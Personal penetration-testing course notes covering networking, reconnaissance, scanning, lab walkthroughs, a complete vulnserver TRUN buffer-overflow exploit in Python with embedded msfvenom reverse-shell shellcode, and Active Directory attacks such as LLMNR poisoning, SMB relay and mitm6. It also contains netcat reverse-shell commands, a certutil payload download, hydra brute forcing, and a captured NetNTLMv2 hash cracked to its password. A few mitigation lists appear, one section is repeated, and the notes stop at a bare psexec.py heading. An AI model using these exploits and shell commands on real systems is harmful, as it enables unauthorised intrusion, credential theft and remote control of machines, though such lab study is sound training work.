------------------------------------------------------------------------

## Network

    IPv4
      32 bits - Decimal
    IPv6
      128 bits - Hexadecimal

    MAC (media access control)
      Layer 2
      Relate to switches communication
      Every equipment in the network (or NIC - network interface controller) has one
      Has 8 pares 
      The first 3 pares are identifiers

    TCP
      SYN > SYN/ACK > ACK

    PORTS (Common)
    TCP
      FTP (21)
      SSH (22)
      Telnet (23)
      SMTP (25)
      DNS (53)
      HTTP (80)
      HTTPS (443)
      SMB (139 + 445)
      IMAP (143

    UDP
      DNS (53)
      DHCP (67,68)
      TFTP (69)
      SNMP (161)

Subnet:

    /24 => network = 255.255.255.0
    Why is /24? because adding the binary check of each octect has the total of 24 bits
    example: 255.255.255.0 = 11111111.11111111.11111111.00000000 = /24

\|1 2 3 4 5 6 7 8 \| 255.0.0.0\|
\|9 10 11 12 13 14 15 16 \| 255.255.0.0\|
\|17 18 19 20 21 22 23 24 \| 255.255.255.0\|
\|25 26 27 28 29 30 31 32 \| 255.255.255.255\|

Hosts:

\|128 64 32 16 8 4 2 1\|

Subnet:

\|128 192 224 240 248 252 254 255\|

ps:

    Hosts double each increment of a CIDR
    Always subtract 2 from host total:
    network ID - First address
    broadcast  - last address

Examples:

\|IP \| subnet \|hosts \|network \|broadcast \|
\|192.168.1.0/24 \|255.255.252.0 \|254 \|192.168.1.0 \|192.168.1.255\|
\|192.168.1.0/28 \|255.255.255.240\|14 \|192.168.1.0 \|192.168.1.15 \|
\|192.168.1.16/28\|255.255.255.240\|14 \|192.168.1.16\|192.168.1.31 \|
\|192.168.0.0/23 \|255.255.254.0 \|510 \|192.168.0.0 \|192.168.1.255\|
\|192.168.2.0/23 \|255.255.254.0 \|510 \|192.168.2.0 \|192.168.3.255\|

Test:

\|IP \| subnet \|hosts \|network \|broadcast \|
\|192.168.0.0/22 \|255.255.252.0 \|1022 \|192.168.0.0\|192.168.3.255\|
\|192.168.1.0/26 \|255.255.255.192\|62 \|192.168.1.0\|192.168.1.63 \|
\|192.168.1.0/27 \|255.255.255.224\|30 \|192.168.1.0\|192.168.1.31 \|

## Linux

    ping <ip> -c 1 > ip.txt

    cat ip.txt | grep "64 bytes" | cut -d " " -f 4 | tr -d ":"
    grep 
    # -v "something " = grab everything except what you specified after -v
    # "somethin" grab what you specified
    cut 
    # -d = delimiter, in this case its a space
    # -f = the 4th junk of that data separeted by spaces
    tr (translate)
    # -d ":" = delimiter - to extract that coma from the line 

ipsweep.sh:

``` bash
#!/bin/bash

if [ "$1" == "" ]
  then
  echo "You forgot an IP address!"
  echo "Syntax: ./ipweep.sh 192.168.0"

else
for ip in `seq 1 254`; do
  ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
  done
fi
```

## Python

``` python

#!/bin/python3

import sys
import socket
from datetime import datetime

# Define our Target
if len(sys.argv) == 2:
  target = socket.gethostbyname(sys.argv[1]) # Translate hostaname to IPv4
else:
  print("Invalid amount of arguments")
  print("Syntax: python3 scanner.py <ip>")

# Add a pretty banner
print ("-" * 50)
print("Scanning target "+target)
print("Time started: "+str(datetime.now()))
print ("-" * 50)

try:
  for port in range(50,85):
    s = socket.socket(socket.AF_INET, socker.SOCK_STREAM)
    socket.setdefaulttimeout(1)
    result = s.connect_ex((target,port)) # returns an error indicator
    if result == 0:
      print(f"Port {port} is open")
    s.close()
except KeyboardInterrupt:
  print("\nExiting program.")
  sys.exit()
except socket.gaierror:
  print("Hostname could not be resolved.")
  sys.exit()
except socker.error:
  print("Could not connect to server.")
  sys.exit()
```

# The Five stages of hacking

1.  Reconnaissance

    Active vs Passive

2.  Scanning & Enumeration

    nmap, nessus, nikto etc

3.  Gaining Access

    exploitation

4.  Maintaining Access

5.  Covering Tracks

## Reconnaissance

### Physical / Social assessment

Location Information:

    Satellite images
    Drone recon
    Building layout (badge readers, break areas, security, fencing)
    Job Information
    Employees (name, job title, phone number, manager, etc)
    pictures (badge photos, desk photos, computer photos, etc)

### Web / Host

    Target Validation:
      WHOIS, nslookup, dnsrecon

    Finding Subdomains:
      Google Fu, dig, nmap, sublist3r, Bluto, crt.sh, etc

    Fingerprinting:
      nmap, wappalyzer, whatweb, BuiltWIth, netcat

    Data Breaches:
      HaveIBeenPwned, Breach-Parse, WeLeakInfo

### Identifying our targets

    bugcrowd.com # find companies that we can scan in scope
    hunter.io # find email addresses
    phonebook.cz # list domains, emails
    voilanorbert.com # find email addresses
    clearbit connect # using within google account to find emails 
    tools.verifyemailaddress.io # email verification
    email-checker.net/validate # email verification

### Gather breachead credentials with breach-parse at wmaverickadams github

breach-parse has +40gb of files that were breached with the sh program, we can scan through this files

### Gather breached credentials with DeHashed

    dehashed.com # search emails, phones, usernames, password, etc
    hashes.org # search breached hashes

### Hunting subdomains

    sublist3r -d <domain>
    crt.sh = %.<domain>  # search certificates that have been registered
    owasp amass - github 
    tomnomnom/httprobe # github = to test the list of domains

### Identifying Website technologies

    builtWith.com = Find out what websites are built with
    wappalyzer - firefox extension = go to the website and run the extension
    whatweb
    burpsuite 
    social media = look 'for' badges, names, pcs, etc

### Google Fu

    site: <> filetype:<> -www +something 

## Scanning & Enumeration

### Network discover

    arp-scan -l 
    netdiscover -r

### port scan

    NMAP
    -sS = SYN SYN/ACK RST (its not send an ack back, thats the stealth mode)

    nmap -T4 -p- -A -sC -sV -oA nmap/initial -vv

    -sU = udp we may scan with -p only 1000 ports, cause it takes too long to finish

### vulnerability scan

    nikto

### directory scan

    dirb
    dirbuster
    gobuster
    dirsearch

### scan SMB

    auxiliary/scanner/smb/smb_version
    smbclient -L \\\\<ip>\\ = list the shares
    smbclient \\\\<ip>\\<share> = open the share

### enumerate ssh

    \ssh <ip> 
    -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc 

> just because the kioptrix1 is old, we need to add these informations
> sometimes we try to login without a login/pwd just to see if there is a banner with information that we can use

### Researching potential vulnerablities

Now we search with the applications and versions that we found earlier, and try to find any exploit that we can use:

    with google:
      exploit-db
      rapid7

    with searchsploit:
      -x = to see the code
      -m = to copy the exploit

    with msfconsole: 
      search

### Configuring Nessus

    download > start service > get key with email > enter localhost port 8834
    use schedule option if u wanna *sleep more*

    /opt/nessus/sbin/nessuscli lsuser # to list User
    /opt/nessus/sbin/nessuscli chpasswd <user> # to change the password

## Gaining Access

### Netcat Reverse Shell = the target connect to us - used the majority of the time

``` bash
Kali:
nc -lvnp <port>

Target:
nc <kali ip> <port> -e /bin/sh
```

### Netcat Bind Shell = we connect to target

``` bash
Kali:
nc <ip> <port>

Target:
nc -lvnp <port> -e /bin/sh
```

### Non-staged vs staged payloads

**non-staged** = send exploit shellcode all at once
larger in size and wont always work
example:
windows/meterpreter_reverse_tcp

**staged** = send payloads in stages
can be less stable
example:
windows/meterpreter/reverse_tcp

> Tips - sometimes try to change the type of payload non-staged/staged

### Exploits

    searchsploit
    msfconsole

### Bruteforce

``` bash
hydra -l <user> -L <user file> -p <password> -P <password file> <host> <service> <req:user/pwd:msg of failure> -t <threads>

msfconsole > auxiliary/scanner/ssh/ssh_login
```

### Burp tips

We can use sniper type of attack to attack one variable and use pitchfork if we need more than 1 variable in burp. Or cluster bomb if we need to try every login/pass possible. To do password spraying or credential stuffing

## Capstone

### Blue

With nmap we find that the target is using windows 7.
searched exploits *for* w7 and got eternal blue - MS17-010

in msf:

``` bash
scanner/smb/smb_ms17_010 
exploit/windows/smb/ms17_010_eternalblue > check
```

To see if the machine is vulnerable to this exploit

We can try manual exploit via github \> search for eternal blue, it might blue screen the machine.

> Tips: In real environments confirm permission to run the exploit, cause it might broke the machine.

### Academy

``` bash
hash-identifier
ffuf -w <wordlist> -u <url>/FUZZ
```

> systemctl list-timers = to see each programs/backups ir running in timers

> pspy - github = To see all program that are running in the system

> \[NOTE\] ctrl+K in nano deletes a line

### Dev

``` bash
showmount -e <target ip> = to show file shares / mount drivers
mkdir mnt/<name>
mount -t nfs <target ip>:<path that show in showmount> /mnt/<name> 

# -t = type

# the path of the share > the path that we will send the mounted share
```

``` bash
fcrackzip = tool to crack zip files that have passwords:
# -v = verbose
# -u = unzip
# -D = dictionary attack
# -p = wordlist file
# <the output file>
```

### Butler

**Grab files in windows**:
after open a server

Example:

``` bash
python3 -m http.server

certutil.exe -urlcache -f http://<kali ip>/<file> <output file>
```

After winPeas:

**Unquoted service path**:
Means that in file register of windows, it need to have quoted path in executable files, and sometimes that is not set in the machine.

Example:

``` bash
insecure ImagePath = C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe
secure ImagePath= "C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe"
```

> When the service is unquoted, windows check for exe files in every space break!

- If we have write permissions,
- we can put a malicious file 'for' example in ..`\Wise`{=tex}`\Wise`{=tex}'.exe', that should be executed.

**To stop a service in Windows**:

``` bash
sc stop <service> = to stop
sc query <service> = to show status
sc start <service> = to start
```

### BlackPearl

``` bash
dnsrecon -r <range 127.0.0.0/24> -n <target ip> -d <anything>
ffuf -w <wordlist>:FUZZ -u <url>/FUZZ

find / -type f -perm -4000 2>/dev/null
GTFObins = to abuse SUID 
```

# Buffer Overflow

- Installed w10 enterprise:

  https://www.microsoft.com/pt-br/evalcenter/evaluate-windows-10-enterprise

- Immunity Debugger 1_85:

  https://www.immunityinc.com/products/debugger/

- vulnserver_master.zip:

  http://www.thegreycorner.com/p/vulnserver.html

- Installed W10 in a VM:

  NAT network

  Dont forget to turnoff windows defender and firewall

## Anatomy of Memory

\|Kernel \| 11111 \|
\|Stack \| \<'we are gonna focus in here'\>\|
\|Heap \| \|
\|Data \| \|
\|Text \| 00000 \|

## Anatomy of Stack

    ESP \| (extended stack pointer)\|

\|Buffer Space\| \|
\| EBP \| (extended base pointer) \|
\| EIP \| (extended instruction pointer) / return address. \|

> Basically, We are gonna inject code to the top of the stack **ESP**

> Until the code surpass the bottom and reach the EIP

> That is where we control the return address, to gain reverse shell or whatever suits us.

## Spiking

192.168.0.11
172.16.127.128

After connecting to the vulnserver:

``` bash
nc -nv <target ip> <port>
```

we type HELP = to see all possibles valible commands

``` bash
HELP

Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
```

- The spiking process is to test by sending caracteres and recon every command to see which is vulnerable
- So we have to test each one of them stats, rtime, ltime etc
- For this usage, we know that the vulnerable is the **TRUN**
  \## Spiking

192.168.0.11 172.16.127.128

After connecting to the vulnserver:

``` shell
nc -nv <target ip> <port>
```

we type HELP = to see all possibles valible commands

``` shell
HELP

Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
```

- The spiking process is to test by sending caracteres and recon every command to see which is vulnerable
- So we have to test each one of them stats, rtime, ltime etc
- For this usage, we know that the vulnerable is the **TRUN**

### generic_send_tcp trun.spk 0 0

    'mkdir stats.spk'

s_readline(); s_string("STATS"); s_string_variable("0");

we just change the 's_string' to the process we wanna to test 'mkdir trun.spk' s_readline(); s_string("TRUN"); s_string_variable("0");

- When we send the spiking script, the vulnerable application should crash
- And in the Registers we should see **ESP**, **EBP** and **EIP** overflowed with **AAA** or **414141**

> **41** is the hexdecimal of **A**

## Fuzzing

``` python

#!/usr/bin/python

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
  try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('172.16.127.128',9999))

    s.send(('TRUN /.:/' + buffer))
    s.close()
    sleep(1)
    buffer = buffer + "A" * 100
  except:
    print "Fuzzing crashed at %s bytes" %str(len(buffer))
    sys.exit()
```

After running, it crashed the application and show us where aproximately it crashed:

``` python
python fuzz.py
^C Fuzzing crashed at '2400 bytes'
```

> If I remember correctly we need to sum 400 bytes, so in 2800 we could overflow the EIP

## Finding the Offset

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2800
    # -l = length that we found fuzzing

``` python

#!/usr/bin/python

import sys, socket

offset = ""

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(('172.16.127.128',9999))
  s.send(('TRUN /.:/' + offset))
  s.close()
except:
  print "Error connecting to server"
  sys.exit()
```

- So we will generate the payload length with **pattern_create**
- And copy the result in the offset variable
- Its supose to crash the application - great

Now we run:

    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2800 -q 386F4337
    # -l = length
    # -q = the value we found in EIP after the crash

> Exact match at **offset** 2003

## Overwriting the EIP

> We discover the offset at 2003 that run before the EIP that is 4 bytes

``` python

#!/usr/bin/python

import sys, socket
offset = 2003
shellcode = "A" * offset + "B" * 4

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(('172.16.127.128',9999))
  s.send(('TRUN /.:/' + shellcode))
  s.close()
except:
  print "Error connecting to server"
  sys.exit()
```

- We modified the last script with the found value of offset before the application break
- And we will execute **B** in those 4 bytes reserved for the **EIP**
- So the result should crash the application again

> However, the value of EBP is 414141 and the value of EIP should be equal to **42424242** = "B"\*4

## Finding Bad Characters

→ https://github.com/cytopia/badchars

> We are gonna add the badchars variable to our script and add in the shellcode variable also

Like this:

``` python

#!/usr/bin/python

import sys, socket

badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

offset = 2003
shellcode = "A" * offset + "B" * 4 + badchars

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(('172.16.127.128',9999))
  s.send(('TRUN /.:/' + shellcode))
  s.close()
except:
  print "Error connecting to server"
  sys.exit()
```

- This time go to Immunity Debugger \> register \> ESP \> follow in dump
- And try to find the badchars in the hexdump

### How to find Bad Chars?

Hex example:

    01 02 03 'B0 B0' 06 07 08
    09 0A 0B 0C 0D 0E 0F 10

> Here we can identifie the 04 05 are out of place, in this case the badchar is 04
> the 05 value is just corrupted by the 04 char

## Finding the right module

Here we are looking for DLL or something similar that has no memory protection

→ https://github.com/corelan/mona

Copy mona.py to 'C:`\Program `{=tex}Files (x86)`\Immunity `{=tex}Inc`\Immunity `{=tex}Debugger`\PyCommands`{=tex}

in Immunity Debugger type:

    !mona modules

> Here we have to choose a module without protection
> that have relation with the program we are attacking

in kali:

    /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

    nasm > JMP ESP
    00000000  FFE4  jmp esp

### Take the value - In this case FFE4

in ImuDeb:

    !mona find -s "\xff\xe4" -m essfunc.dll

- The result is gonna be to show us the pointers
- We choose a pointer starting from the top

In this case: 0x625011af

We need to reverse this pointer value like this:

    '0x625011af' >> '\xaf\x11\x50\x62'

- because x86 architectures read the lower order address first, thats why its in reverse

Python updated:

``` python

#!/usr/bin/python 

import sys, socket

offset = 2003
# eip = "B" * 4
pointer = "\xaf\x11\x50\x62"
shellcode = "A" * offset + pointer #+ eip

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(('172.16.127.128',9999))
  s.send(('TRUN /.:/' + shellcode))
  s.close()
except:
  print "Error connecting to server"
  sys.exit()
```

### In Immunity

    Go to a blue arrow > 'go to address in disassembler'
    Type the address > in this case: '625011af'
    should appear the JMP ESP FFE4
    press 'F2' to set a breakpoint in the address we wanna modify and run the script

> This should break the application again and the value of EIP should be the same as our address 625011af

## Generating Shellcode and Gaining Root

### Creating the reverse shell payload

``` bash
msfvenom -p windows/shell_reverse_tcp LHOST=<our ip> LPORT=<port> EXITFUNC=thread -f c -a x86 -b "\x00"

# -p = payload
# EXITFUNC = let our payload more stable
# -f = file type
# -a = architecture
# -b = badchars that we found during the process, in this case none so we add only the default 
```

- always note the payload size, could be important
- copy the payload (between parenteses) to our last script
- moreover, we need to add a padding/NOP (no operational) space before the overflow payload

``` python

#!/usr/bin/python
import sys, socket

offset = "A" * 2003
pointer = "\xaf\x11\x50\x62"
overflow = ("\xb8\x1e\x4c\x2e\xcc\xd9\xc9\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x31\x47\x12\x03\x47\x12\x83\xd9\x48\xcc\x39\x19\xb8\x92"
"\xc2\xe1\x39\xf3\x4b\x04\x08\x33\x2f\x4d\x3b\x83\x3b\x03\xb0"
"\x68\x69\xb7\x43\x1c\xa6\xb8\xe4\xab\x90\xf7\xf5\x80\xe1\x96"
"\x75\xdb\x35\x78\x47\x14\x48\x79\x80\x49\xa1\x2b\x59\x05\x14"
"\xdb\xee\x53\xa5\x50\xbc\x72\xad\x85\x75\x74\x9c\x18\x0d\x2f"
"\x3e\x9b\xc2\x5b\x77\x83\x07\x61\xc1\x38\xf3\x1d\xd0\xe8\xcd"
"\xde\x7f\xd5\xe1\x2c\x81\x12\xc5\xce\xf4\x6a\x35\x72\x0f\xa9"
"\x47\xa8\x9a\x29\xef\x3b\x3c\x95\x11\xef\xdb\x5e\x1d\x44\xaf"
"\x38\x02\x5b\x7c\x33\x3e\xd0\x83\x93\xb6\xa2\xa7\x37\x92\x71"
"\xc9\x6e\x7e\xd7\xf6\x70\x21\x88\x52\xfb\xcc\xdd\xee\xa6\x98"
"\x12\xc3\x58\x59\x3d\x54\x2b\x6b\xe2\xce\xa3\xc7\x6b\xc9\x34"
"\x27\x46\xad\xaa\xd6\x69\xce\xe3\x1c\x3d\x9e\x9b\xb5\x3e\x75"
"\x5b\x39\xeb\xda\x0b\x95\x44\x9b\xfb\x55\x35\x73\x11\x5a\x6a"
"\x63\x1a\xb0\x03\x0e\xe1\x53\xec\x67\xe9\xa8\x84\x75\xe9\xbf"
"\x08\xf3\x0f\xd5\xa0\x55\x98\x42\x58\xfc\x52\xf2\xa5\x2a\x1f"
"\x34\x2d\xd9\xe0\xfb\xc6\x94\xf2\x6c\x27\xe3\xa8\x3b\x38\xd9"
"\xc4\xa0\xab\x86\x14\xae\xd7\x10\x43\xe7\x26\x69\x01\x15\x10"
"\xc3\x37\xe4\xc4\x2c\xf3\x33\x35\xb2\xfa\xb6\x01\x90\xec\x0e"
"\x89\x9c\x58\xdf\xdc\x4a\x36\x99\xb6\x3c\xe0\x73\x64\x97\x64"
"\x05\x46\x28\xf2\x0a\x83\xde\x1a\xba\x7a\xa7\x25\x73\xeb\x2f"
"\x5e\x69\x8b\xd0\xb5\x29\xab\x32\x1f\x44\x44\xeb\xca\xe5\x09"
"\x0c\x21\x29\x34\x8f\xc3\xd2\xc3\x8f\xa6\xd7\x88\x17\x5b\xaa"
"\x81\xfd\x5b\x19\xa1\xd7")

padding = "\x90" * 20

shellcode = offset + pointer + padding + overflow

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('172.16.127.128',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print "Error connecting to server"
    sys.exit()
```

> set netcat and run the exploit
> we have root

## Exploit Development Using Python3 and Mona

in immunity:

``` bash
!mona config -set workingfolder c:\mona
!mona bytearray -cpb "\x00\x0a"
!mona compare -f c:\mona\bytearray.bin -a <ESP>

!mona jmp -r ESP -m "essfunc.dll"
```

ESP 015919F8

- A couple of changes using python3
- example print("") with parenteses and payload should be encoded
- every input should be byte encoded like b("`\x00`{=tex}`\x01`{=tex}")

``` python

#!/usr/bin/python3
import sys, socket

offset = b"A" * 2003
pointer = b"\xaf\x11\x50\x62"
overflow = (b"\xb8\x1e\x4c\x2e\xcc\xd9\xc9\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
b"\x52\x31\x47\x12\x03\x47\x12\x83\xd9\x48\xcc\x39\x19\xb8\x92"
b"\xc2\xe1\x39\xf3\x4b\x04\x08\x33\x2f\x4d\x3b\x83\x3b\x03\xb0"
b"\x68\x69\xb7\x43\x1c\xa6\xb8\xe4\xab\x90\xf7\xf5\x80\xe1\x96"
b"\x75\xdb\x35\x78\x47\x14\x48\x79\x80\x49\xa1\x2b\x59\x05\x14"
b"\xdb\xee\x53\xa5\x50\xbc\x72\xad\x85\x75\x74\x9c\x18\x0d\x2f"
b"\x3e\x9b\xc2\x5b\x77\x83\x07\x61\xc1\x38\xf3\x1d\xd0\xe8\xcd"
b"\xde\x7f\xd5\xe1\x2c\x81\x12\xc5\xce\xf4\x6a\x35\x72\x0f\xa9"
b"\x47\xa8\x9a\x29\xef\x3b\x3c\x95\x11\xef\xdb\x5e\x1d\x44\xaf"
b"\x38\x02\x5b\x7c\x33\x3e\xd0\x83\x93\xb6\xa2\xa7\x37\x92\x71"
b"\xc9\x6e\x7e\xd7\xf6\x70\x21\x88\x52\xfb\xcc\xdd\xee\xa6\x98"
b"\x12\xc3\x58\x59\x3d\x54\x2b\x6b\xe2\xce\xa3\xc7\x6b\xc9\x34"
b"\x27\x46\xad\xaa\xd6\x69\xce\xe3\x1c\x3d\x9e\x9b\xb5\x3e\x75"
b"\x5b\x39\xeb\xda\x0b\x95\x44\x9b\xfb\x55\x35\x73\x11\x5a\x6a"
b"\x63\x1a\xb0\x03\x0e\xe1\x53\xec\x67\xe9\xa8\x84\x75\xe9\xbf"
b"\x08\xf3\x0f\xd5\xa0\x55\x98\x42\x58\xfc\x52\xf2\xa5\x2a\x1f"
b"\x34\x2d\xd9\xe0\xfb\xc6\x94\xf2\x6c\x27\xe3\xa8\x3b\x38\xd9"
b"\xc4\xa0\xab\x86\x14\xae\xd7\x10\x43\xe7\x26\x69\x01\x15\x10"
b"\xc3\x37\xe4\xc4\x2c\xf3\x33\x35\xb2\xfa\xb6\x01\x90\xec\x0e"
b"\x89\x9c\x58\xdf\xdc\x4a\x36\x99\xb6\x3c\xe0\x73\x64\x97\x64"
b"\x05\x46\x28\xf2\x0a\x83\xde\x1a\xba\x7a\xa7\x25\x73\xeb\x2f"
b"\x5e\x69\x8b\xd0\xb5\x29\xab\x32\x1f\x44\x44\xeb\xca\xe5\x09"
b"\x0c\x21\x29\x34\x8f\xc3\xd2\xc3\x8f\xa6\xd7\x88\x17\x5b\xaa"
b"\x81\xfd\x5b\x19\xa1\xd7")

padding = b"\x90" * 20

shellcode = offset + pointer + padding + overflow

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(('172.16.127.128',9999))
  payload = b"TRUN /.:/" + shellcode

# we could use payload.encode, but sometimes the payload does not work
# thats why we are byte encoding manually every input

  s.send((payload))
  s.close()
except:
  print("Error connecting to server")
  sys.exit()
```

# AD

Authenticates using Kerberos tickets:

    non-Windows devices, such as Linux machines, firewalls, etc. 
    Can also authenticate to AD via RADIUS or LDAP

## Physical AD Components

### Domain Controller

    Host a copy of the AD DS directory store
    Provide authentication and authorization services
    Replicate updates to other domain controllers in the domain and forest
    Allow administrative access to manage user accounts and network resources

### The AD DS data store

    Consists of the Ntds.dit file
    Is stored by default in the %SystemRoot%\NTDS folder on all domain controllers
    Is accessible only through the domain controller processes and protocols

## Logical AD Components

### AD DS Schema

    Enforces rules regarding object creation and configuration

### Domain

    Used to group and manage objects in an organization

### Trees

    Hierarchy of domains in AD DS
    Share a contiguous namespace with the parent domain
    Can have additional child domains

### Forest

    Collection of one or more trees
    Share a common schema
    Share the enterprise Admins and Schema Admins groups

### Organizational Units (Ous)

    AD containers that contain users, groups, computers and others OUs
    Delegate permissions to administer groups of objects
    Represent your organization hierarchically and logically

### Trusts

    How we have access between resources:
    Directional = trust goes to trusted domain to a trusted domain
    Transitive = trust relationship is extended beyond a two-domain trust

### Objects

    whats inside OUs:
    user, group, computer, printers, contacts, shared folders, etc

## Lab Overview and Requirements

    1 Windows Server 2019
    2 Windows 10 Enterprise

    Requirements:
    60 GB Disk Space
    16 GB RAM

### Links

    https://www.microsoft.com/pt-br/evalcenter/evaluate-windows-10-enterprise
    https://www.microsoft.com/pt-br/evalcenter/evaluate-windows-server-2019

    Install AD DS on server
    setup the AD
    change the names of the computers

### cmd with admin privileges

``` bash
setspn -a SAIBOT-DC/SQLService.MK.local:60111 MK\SQLService
# -a = domain controller 
```

### Create a GPO in the forest domain, - disable windows defender

    windows > administrative > Windows components > Windows defender > disable w defender
    set the enforced option in GPO > Rule > scope > enforced = "yes"
    This will make sure that every machine in the domain, disable the windows defender

- add both machines to the domain
- log with administrator in both machines and
- add one user to local admin in his machine and another with local admin in the 2 machines
- create a file called **share** in C: in both machines

## Attacking AD: Initial Attack Vectors

### LLMNR - Poisoning

Used to identify hosts when DNS fails to do so.

**Step 1**:

    Run Responder
    python Responder.py -I tun0 -rdw

**Step 2**:

    An Event Occurs...

**Step 3**:

    Get Dem Hashes

**Step 4**:

    Crack Dem Hashes:
    hashcat -m 5600 hash.txt rockyou.txt

### SMB Relay

Instead of cracking hashes, we can relay those hashes to specific machines and potentially gain access

SMB signing must be disabled on the target

**Step 1**:

        Run Responder -> nano responder.conf
        disable SMB and HTTP -> cause we are going to be listening but not responding back

**Step 2**:

``` bash
python Responder.py -I tun0 -rdw
```

**Step 3**:

``` bash
Set up your relay:
python ntlmrelayx.py -tf target.txt -smb2support
```

**Step 4**:

``` bash
An Event occours...
```

**Step 5**:

``` bash
Win!
```

### IPv6 Attacks Overview

We are gonna set a DNS to the Ipv6 because they generally do not have one.

So I will get information and set NTLM with MITM6 to create an account in DC
**Step 1**:

    download MITM6 > https://github.com/dirkjanm/mitm6.git

**Step 2**:

    In the server > manage >  add roles and features > active directory certificate services > cert authority

- Take a look at PassBack attack - look at printers, sometimes we can redirect the networking in the config
- page of the printer to our kali machine and set up a netcat or a responder to get the password/access

### LLMNR

IPS:

    server = 172.16.127.129
    ermac-pc1 = 172.16.127.128
    subzero-pc2 = 172.16.127.130

#### Responder

``` bash
responder -I eth0 -rdw

# tips is to run this tool early in the morning
# any machine in the AD who access our attacker IP
# the responder is gonna capture their hashes
```

#### Go crack with hashcat

``` bash
hashcat -m 5600 hash rockyou.txt
# -m 5600 = NetNTLMv2

ERMAC::MK:c1a71fa9c4173965:a53bb1b11fd1444e7ec42216ec49a04f:01010000000000008011f80f19c9d70150783cc36d9aafd40000000002000800410038005200360001001e00570049004e002d004a0056005800470054004c004200510049004f00540004003400570049004e002d004a0056005800470054004c004200510049004f0054002e0041003800520036002e004c004f00430041004c000300140041003800520036002e004c004f00430041004c000500140041003800520036002e004c004f00430041004c00070008008011f80f19c9d7010600040002000000080030003000000000000000010000000020000054c8bbe07c882c5bd501dc943c19e4c47c1ba84a9556cd1beb5930ca01be55b30a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e0030002e00310031000000000000000000:'Password1'
```

#### Mitigation - LLMNR - NBT-NS

``` bash
Disable LLMNR and NBT-NS
Require Network Access Control
Require strong user passwords >14 characters + the more complex harder to attacker to break it
```

### SMB Relay

#### Discovering Hosts with SMB Signing Disabled

``` bash
nmap --script=smb2-security-mode.nse -p 445 <ip>/24
# 'Message signing enabled but not required' - This is what we need to perform this attack

/etc/responder/Responder.conf
# turnoff SMB and HTTP
```

**Attack walkthrough**:

``` bash
responder -I eth0 -rdw
python ntlmrelayx.py -tf target.txt -smb2support

# connect to our attack IP
# Get the SAM hashes = it would be like shadow in linux
```

**With interactive shell**:

``` bash
responder -I eth0 -rdw
python ntlmrelayx.py -tf target.txt -smb2support -i
# trigger the event connecting in our kali IP
# Get the port of smb client shell in ntlmrelayx tab

nc 127.0.0.1 <port>
# we got a smb shell
# help to show options

# in ntmlrelayx
# -e = execute some program, msfvenom \for example
# -c = command, "whoami", "dir", "reverse shell whatever" etc
```

#### Mitigation - SMB Relay

``` bash
# Enable SMB signing on all devices
# Disable NTLM authentication on network
# Account tiering - limits domain admin to specifc tasks
# Local admin restriction
```

### Gaining Shell Access

#### Metasploit

``` bash
search psexec
  use exploit - t/windows/smb/psexec
  or exploit/windows/smb/psexec_psh
```

#### psexec.py

